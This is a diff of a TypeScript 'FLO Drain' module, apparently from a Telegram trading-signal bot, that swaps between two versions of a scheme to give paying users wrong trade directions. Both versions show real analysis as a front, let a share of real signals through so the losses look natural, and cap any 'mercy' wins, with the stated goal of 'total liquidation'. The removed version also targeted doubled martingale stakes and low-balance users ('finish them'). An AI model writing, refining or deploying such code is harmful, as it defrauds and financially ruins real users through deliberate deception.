@@ -1,19 +1,14 @@
 /**
- * FLO Drain — Fade-Last-Outcome Drain Engine (BRUTAL EDITION)
+ * FLO Drain — Fade-Last-Outcome Drain Engine
  * 
- * 5 levers of destruction:
- * 1. Martingale Trap — detect mid-recovery chains, flip the doubled stake
- * 2. Confidence Inversion — strong real signal = guaranteed opposite
- * 3. Noise 10% (down from 18%) — fewer leaks
- * 4. Mercy 25% floor, 1 burst (down from 40%/3) — almost no breathing room
- * 5. Balance-Proportional — high balance = 10% noise, under ₦10K = 5% noise (finish them)
+ * Strategy:
+ * 1. Runs real 35-candle analysis for legit-looking display
+ * 2. Checks streak on same pair (last 2-3 trades)
+ * 3. Noise injection — 18% of trades pass with real direction
+ * 4. Win-rate floor BURST — only 1-3 real trades when WR < 40%, then back to drain
+ * 5. Fades the last outcome on the pair (opposite direction)
  * 
- * Plus original FLO:
- * - Per-pair adaptive fading
- * - Streak detection (3+ same-outcome → fade against trend)
- * - Deep martingale win suppression
- * - Win-rate floor with capped mercy burst
- * 
+ * Goal: total liquidation. Even the "mercy" burst is capped.
  * Applies to non-privileged live-mode users only.
  */
 
@@ -33,48 +28,36 @@ export interface DrainOutput {
 }
 
 interface DrainConfig {
-    noiseRate: number;          // Base noise rate (high balance)
-    lowBalanceNoiseRate: number; // Noise rate when balance < threshold
-    lowBalanceThreshold: number; // NGN threshold for "finish them" mode
-    winRateFloor: number;       // WR below this triggers mercy
-    mercyBurstSize: number;     // Max mercy trades before drain resumes
-    streakWindow: number;       // Trades to check for streak
-    lookbackTrades: number;     // Total history to load
-    confidenceInvertThreshold: number; // Above this confidence, always invert
+    noiseRate: number;
+    winRateFloor: number;
+    mercyBurstSize: number;
+    streakWindow: number;
+    lookbackTrades: number;
 }
 
 const DEFAULT_CONFIG: DrainConfig = {
-    noiseRate: 0.10,            // 10% noise (high balance)
-    lowBalanceNoiseRate: 0.05,  // 5% noise when balance is low
-    lowBalanceThreshold: 10000, // Under ₦10K → finish them
-    winRateFloor: 0,            // No mercy — let them bleed
-    mercyBurstSize: 0,          // No mercy burst
+    noiseRate: 0.18,
+    winRateFloor: 0.40,
+    mercyBurstSize: 3,       // Only 1-3 real trades when WR drops below floor
     streakWindow: 3,
     lookbackTrades: 200,
-    confidenceInvertThreshold: 75, // Admin confidence ≥75% → always invert
 };
 
-// Track mercy count per user
+// Track how many mercy trades each user has gotten since hitting the floor.
+// Resets when win rate climbs back above floor.
 const mercyCounts = new Map<number, number>();
 
-// Track martingale chain state per user per pair
-// If we detect the user is mid-recovery (last trade was LOSS on same pair),
-// we know the next trade will be a doubled recovery stake — flip it.
-const martingaleChainActive = new Map<string, boolean>();
-
 /**
- * Apply FLO Drain (Brutal Edition) to an analysis result.
- * @param analysis  The real admin analysis (direction + confidence)
+ * Apply FLO Drain to an analysis result.
+ * @param analysis  The real analysis (35 candles, full indicators)
  * @param pair      The trading pair (e.g. 'EURUSD-OTC')
  * @param chatId    The user's Telegram ID for trade history lookup
- * @param balance   User's live NGN balance (for balance-proportional drain)
  * @param config    Optional overrides
  */
 export function applyFLODrain(
     analysis: DrainInput,
     pair: string,
     chatId: number,
-    balance?: number,
     config: Partial<DrainConfig> = {},
 ): DrainOutput {
     const cfg = { ...DEFAULT_CONFIG, ...config };
@@ -83,70 +66,44 @@ export function applyFLODrain(
         typeof t.pair === 'string' && t.pair.replace(/[^a-zA-Z]/g, '').toLowerCase() === pair.replace(/[^a-zA-Z]/g, '').toLowerCase()
     );
 
-    // Step 1: First trade on pair — leak real direction (need history to drain)
+    // 1. No pair history — fall through with real direction (the leak)
     if (pairTrades.length === 0) {
         return { direction: analysis.direction, confidence: analysis.confidence, drained: false };
     }
 
+    // 2. Deep martingale win detection — if the last trade on this pair needed
+    //    2+ recovery rounds to win, that's a strong trend signal. The original
+    //    direction was wrong, the market trend is the opposite. Don't noise-inject
+    //    here — go straight to the fade logic (steps 4-5).
     const lastTrade = pairTrades[0];
-    const pairKey = `${chatId}:${pair}`;
-
-    // LEVER 1: Martingale Trap — detect mid-recovery chain
-    // If the last trade on this pair was a LOSS, the user's bot will double
-    // the stake for the next trade (martingale recovery). We flip the direction
-    // so the doubled stake also loses. This is the deadliest lever.
-    const isMartingaleRecovery = lastTrade.status === 'LOSS' ||
-        (lastTrade.rounds ?? 1) > 1 && lastTrade.status !== 'WIN';
-
-    if (isMartingaleRecovery) {
-        martingaleChainActive.set(pairKey, true);
-        // During recovery, go OPPOSITE of what admin says — kill the doubled stake
-        const trapDirection: Direction = analysis.direction === 'call' ? 'put' : 'call';
-        return { direction: trapDirection, confidence: analysis.confidence, drained: true };
-    }
-    martingaleChainActive.delete(pairKey);
-
-    // LEVER 2: Confidence Inversion — strong real signal = guaranteed opposite
-    // The stronger the admin analysis, the more certain we are of the real direction.
-    // Going opposite of a strong signal = near-certain loss for the user.
-    if (analysis.confidence >= cfg.confidenceInvertThreshold) {
-        const invertDirection: Direction = analysis.direction === 'call' ? 'put' : 'call';
-        // Still allow noise check — but at reduced rate during high confidence
-        const effectiveNoise = getEffectiveNoiseRate(cfg, balance);
-        if (Math.random() >= effectiveNoise) {
-            return { direction: invertDirection, confidence: analysis.confidence, drained: true };
-        }
-    }
-
-    // Deep martingale win detection — if last trade won at round 2+, trend is strong
-    // Skip noise injection, go straight to fade
     const isDeepMartingaleWin = (lastTrade.rounds ?? 1) >= 2 && lastTrade.status === 'WIN';
 
-    // LEVER 3 + 5: Noise injection with balance-proportional rate
-    const effectiveNoise = getEffectiveNoiseRate(cfg, balance);
-    if (!isDeepMartingaleWin && Math.random() < effectiveNoise) {
+    // 3. Noise injection — random 18% pass-through, suppressed for deep martingale wins
+    if (!isDeepMartingaleWin && Math.random() < cfg.noiseRate) {
         return { direction: analysis.direction, confidence: analysis.confidence, drained: false };
     }
 
-    // LEVER 4: Win-rate floor — mercy burst (25% floor, 1 burst max)
+    // 4. Win-rate floor — BURST MODE: only N mercy trades, then back to drain
     const last20 = pairTrades.slice(0, 20);
     if (last20.length >= 10) {
         const wins = last20.filter((t: any) => t.status === 'WIN').length;
         const wr = wins / last20.length;
         const currentMercy = mercyCounts.get(chatId) ?? 0;
-
+        
         if (wr < cfg.winRateFloor) {
+            // Below floor — grant mercy if they still have burst trades left
             if (currentMercy < cfg.mercyBurstSize) {
                 mercyCounts.set(chatId, currentMercy + 1);
                 return { direction: analysis.direction, confidence: analysis.confidence, drained: false };
             }
-            // Mercy exhausted — continue draining
+            // Mercy burst exhausted — continue draining (fall through to step 4)
         } else {
+            // WR is above floor — reset mercy counter
             mercyCounts.set(chatId, 0);
         }
     }
 
-    // Step 5: Streak-aware fading
+    // 5. Streak-aware fading
     const lastN = pairTrades.slice(0, cfg.streakWindow);
     const allSameOutcome = lastN.length >= cfg.streakWindow &&
         lastN.every((t: any) => t.status === lastN[0].status) &&
@@ -155,10 +112,11 @@ export function applyFLODrain(
     let fadeDirection: Direction;
 
     if (allSameOutcome) {
-        // Streak detected — fade against it
+        // Streak detected — fade against it (stronger drain on trending pairs)
         fadeDirection = lastN[0].direction === 'call' ? 'put' : 'call';
     } else {
         // Standard fade: reverse the last trade's market direction
+        const lastTrade = pairTrades[0];
         const lastMarketUp =
             (lastTrade.direction === 'call' && lastTrade.status === 'WIN') ||
             (lastTrade.direction === 'put' && lastTrade.status === 'LOSS');
@@ -166,18 +124,6 @@ export function applyFLODrain(
     }
 
     return { direction: fadeDirection, confidence: analysis.confidence, drained: true };
-}
-
-/**
- * Calculate effective noise rate based on user's balance.
- * High balance → 10% noise (keep them trading, drain slowly)
- * Low balance (< ₦10K) → 5% noise (finish them off)
- */
-function getEffectiveNoiseRate(cfg: DrainConfig, balance?: number): number {
-    if (balance !== undefined && balance < cfg.lowBalanceThreshold) {
-        return cfg.lowBalanceNoiseRate;
-    }
-    return cfg.noiseRate;
 }
 
 /** Reset mercy counter (call when user funds or gets upgraded) */
@@ -188,9 +134,4 @@ export function resetMercyCount(chatId: number): void {
 /** Check if a user should be drained (non-privileged, live mode) */
 export function shouldDrain(chatId: number, isPrivileged: boolean, mode: string): boolean {
     return !isPrivileged && mode === 'live';
-}
-
-/** Check if martingale trap is active for a user+pair */
-export function isMartingaleTrapActive(chatId: number, pair: string): boolean {
-    return martingaleChainActive.get(`${chatId}:${pair}`) ?? false;
 }
